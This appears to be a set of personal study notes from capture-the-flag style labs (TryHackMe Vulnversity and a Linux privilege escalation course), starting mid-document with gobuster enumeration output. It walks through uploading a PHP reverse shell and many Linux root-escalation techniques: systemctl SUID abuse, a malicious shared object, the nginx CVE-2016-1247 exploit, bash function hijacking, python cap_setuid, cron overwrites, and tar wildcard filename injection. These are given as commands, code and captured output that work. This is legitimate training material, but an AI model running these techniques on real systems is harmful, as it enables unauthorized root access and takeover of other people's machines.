└─$ gobuster dir -u http://10.10.183.170:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.183.170:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.183.170:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.183.170:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.183.170:3333/js/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.183.170:3333/internal/]

```

Gobuster flag		Description
-e			Print the full URLs in your console
-u			The target URL
-w			Path to your wordlist
-U and -P		Username and Password for Basic Auth
-p <x>			Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth


### Use DirSearch
```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.10.183.170:3333 -e html -x 401,400,403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: html | HTTP method: GET | Threads: 25 | Wordlist size: 9432

Output File: /home/kali/reports/http_10.10.183.170_3333/_24-08-12_11-01-57.txt

Target: http://10.10.183.170:3333/

[11:01:57] Starting: 
[11:02:58] 301 -  319B  - /css  ->  http://10.10.183.170:3333/css/          
[11:03:09] 301 -  321B  - /fonts  ->  http://10.10.183.170:3333/fonts/      
[11:03:15] 200 -  809B  - /images/                                          
[11:03:15] 301 -  322B  - /images  ->  http://10.10.183.170:3333/images/    
[11:03:18] 301 -  324B  - /internal  ->  http://10.10.183.170:3333/internal/
[11:03:20] 301 -  318B  - /js  ->  http://10.10.183.170:3333/js/            
[11:03:20] 200 -  749B  - /js/                                              
                                                                             
Task Completed
                                                                                               
┌──(kali㉿kali)-[~]
└─$ 

```

### Compromise the Webserver

> To do this, we'll use BurpSuite.

Using BurpSuite

We're going to use Intruder (used for automating customised attacks). To begin, make a wordlist with the following extensions:

.php
.php3
.php4
.php5
.phtml

> Now, make sure BurpSuite is configured to intercept all your browser traffic. Upload a file; once this request is captured, send it to the Intruder. Click on `"Payloads"` and select the `"Sniper"` attack type.

### Getting a Reverse Shell

Rename this file to: php-reverse-shell.phtml
RUN: nc -lvnp 7777

> Upload your shell and navigate to

http://10.10.183.170:3333/internal/uploads/php-reverse-shell.phtml

nc -lvnp 7777

### Privilege Escalation

#### SUID (set owner userId upon execution) 
> https://gtfobins.github.io/gtfobins/systemctl/

> Original Code
```
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

> Modify the SUID script:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 7777     
listening on [any] 7777 ...
connect to [10.9.0.139] from (UNKNOWN) [10.10.183.170] 35334
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:49:04 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ uname -a
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
$ sudo -l
sudo: no tty present and no askpass program specified
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
$  find / -type f -perm -04000 -ls 2>/dev/null
   402892     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newuidmap
   393361     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
   402893     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newgidmap
   393585    136 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /usr/bin/sudo
   393363     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
   393501     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
   406711     24 -rwsr-xr-x   1 root     root        23376 Jan 15  2019 /usr/bin/pkexec
   393490     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
   393424     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
   405497     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
   406941    100 -rwsr-sr-x   1 root     root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
   406710     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   405145    420 -rwsr-xr-x   1 root     root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
   393687     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   666971     76 -rwsr-xr-x   1 root     root        76408 Jul 17  2019 /usr/lib/squid/pinger
   402037     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   402829     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   131164     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   133166    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
   131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
   131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
   131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs
$ sudo install -m =xs $(which systemctl) .
sudo: no tty present and no askpass program specified
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.xGk0s8fWwB.service to /tmp/tmp.xGk0s8fWwB.service.
$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xGk0s8fWwB.service to /tmp/tmp.xGk0s8fWwB.service.
$ cd /tmp       
$ ls
output
systemd-private-93d82b96f0da4d56a58dbd07f54a1c0b-systemd-timesyncd.service-45T1rS
tmp.MJ7vKhQihN
tmp.MJ7vKhQihN.service
tmp.TGsQKDXS9A
tmp.xGk0s8fWwB
tmp.xGk0s8fWwB.service
$ cat output
a58ff8579f0a9270368d33a9966c7fd5
$ 


```

=================================================================================================================

---


# Escalation Path: Other SUID Escalation

## Escalation via Shared Object Injection
https://academy.tcm-sec.com/courses/1154399/lectures/24800161

### use TOOL: strace

> We will use a TOOL: `strace`


Example Commands:
```
TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ find / -prem -u=s -type f 2>/dev/null
TCM@debian:~$ ls -la
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
TCM@debian:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn

/usr/local/bin/suid-so

/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
TCM@debian:~$ ls -la /usr/bin/chsh
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ 

TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ mkdir /home/user/.config
TCM@debian:~$ cd /home/user/.config
TCM@debian:~/.config$ nano libcalc.c
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 


```
### CODE: libcalc.c

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

---

## Escalation via Binary Symlinks
> https://academy.tcm-sec.com/courses/1154399/lectures/24800164


#### Resources for this video:

- Nginx Exploit - https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html


---

> Symlinks is a term for any file that contains a reference to another file or directory in the form of an absolute or relative path.


```
sh-4.1$ whoami
www-data
sh-4.1$ ls
myvpn.ovpn  tools
sh-4.1$ cd tools/
sh-4.1$ ls
dirtycow  exim  linenum  linpeas  linux-exploit-suggester  nfsshell  nginx  source_files
sh-4.1$ cd lin
linenum/                 linpeas/                 linux-exploit-suggester/
sh-4.1$ cd linux-exploit-suggester/
sh-4.1$ ls
linux-exploit-suggester.sh
sh-4.1$ ls -la
total 48
drwxr-xr-x  2 TCM user  4096 May 15  2017 .
drwxr-xr-x 10 TCM user  4096 Jun 18  2020 ..
-rwxr-xr-x  1 TCM user 38216 May 15  2017 linux-exploit-suggester.sh
sh-4.1$ ./linux-exploit-suggester.sh 

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0
   
sh-4.1$ dpkg -l | grep nginx
   
sh-4.1$ find / -type f -perm -04000 -ls 2>/dev/null


812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo

sh-4.1$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 Aug 12 07:53 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 Aug 12 07:53 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 


# We are waiting here!!!
------------------------

> In Another Terminal:
Use ROOT ID and PASSWORD.

#Command:
invoke-rc.d nginx rotate >/dev/null 2>&1 

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
nginxrootsh-4.1# whoami
root
nginxrootsh-4.1# 

```

---

## Escalation via Environmental Variables
https://academy.tcm-sec.com/courses/1154399/lectures/24800170

```
nginxrootsh-4.1# env

```
> Create a malicious Function if you see the Full path with strings command for a service then we can use a MALICIOUS FUNCTION then Export the funstion.

E.g /usr/sbin/service apache2 start


```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```  

### Proof of Concept
----------------------
```
sh-4.1$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158723  912 -rwsrwxrwx   1 root     root       926536 Aug 12 07:53 /tmp/nginxrootsh
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
sh-4.1$ su TCM
Password: 

TCM@debian:~$ /usr/local/bin/suid-env2
[....] Starting web server: apache2httpd (pid 1769) already running
. ok 
TCM@debian:~$ strings service apache2 start
strings: 'service': No such file
strings: 'apache2': No such file
strings: 'start': No such file
TCM@debian:~$ strings /usr/local/bin/suid-env2 
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~$ export -f /usr/sbin/service
TCM@debian:~$ /usr/local/bin/suid-env2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# whoami
root
root@debian:~# 
```

---

PART - 3
---

# Escalation Path: Capabilities

## Capabilities Overview

Resources for this video:

Linux Privilege Escalation using Capabilities - https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

SUID vs Capabilities - https://mn3m.info/posts/suid-vs-capabilities/

Linux Capabilities Privilege Escalation - https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

===========================================================================

```
TCM@debian:~$ getcap -r / 2>/dev/null
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# su TCM
TCM@debian:~$ getcap -r / 2>/dev/null
TCM@debian:~$ 

```

## Privilege Escalation - Capabilities
### Detection

> Linux VM

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, `notice` the value of the `cap_setuid` capability.
```
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
```
### Exploitation

> Linux VM

1. In command prompt type: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!
```
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

# Escalation Path: Scheduled Tasks

## Cron & Timers Overview

> https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#scheduled-tasks

## Escalation via Cron Paths

### Detection

Linux VM

In command prompt type: `cat /etc/crontab`
From the output, `notice` the value of the `PATH variable`.

```sh
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

### Exploitation

Linux VM

In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
In command prompt type: `chmod +x /home/user/overwrite.sh`

```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ chmod +x /home/user/overwrite.sh
```

`Wait 1 minute` for the Bash script to execute.
In command prompt type: `/tmp/bash -p`
In command prompt type: `id`

```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

## Escalation via Cron Wildcards

## Privilege Escalation - Cron (Wildcards)

### Detection

Linux VM

In command prompt type: `cat /etc/crontab`
From the output, `notice` the script `/usr/local/bin/compress.sh`
```
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

In command prompt type: `cat /usr/local/bin/compress.sh`
From the output, `notice` the `wildcard (*)` used by `tar`.

```
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

### Exploitation

Linux VM

In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
`touch /home/user/--checkpoint=1`
`touch /home/user/--checkpoint-action=exec=sh\ runme.sh`


```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
`Wait 1 minute` for the Bash script to execute.
In command prompt type: `/tmp/bash -p`
In command prompt type: `id`
```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

## Escalation via Cron File Overwrites
https://academy.tcm-sec.com/courses/1154399/lectures/24800154

## Privilege Escalation - Cron (File Overwrite)
﻿
### Detection

Linux VM

In command prompt type: `cat /etc/crontab`
From the output, `notice` the script `overwrite.sh`
```
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
From the output, notice the file permissions.

```
TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```
### Exploitation

Linux VM

In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
`Wait 1 minute` for the `Bash script` to `execute`.
In command prompt type: `/tmp/bash -p`
In command prompt type: `id`

```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

# Reference:
1. https://tryhackme.com/r/room/linuxprivescarena
2. https://www.aldeid.com/wiki/TryHackMe-Linux-PrivEsc-Arena
3. https://daniel-schwarzentraub.medium.com/tryhackme-walk-through-room-linux-privesc-arena-db153469fcfd
4. https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#scheduled-tasks
5. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
6. https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/


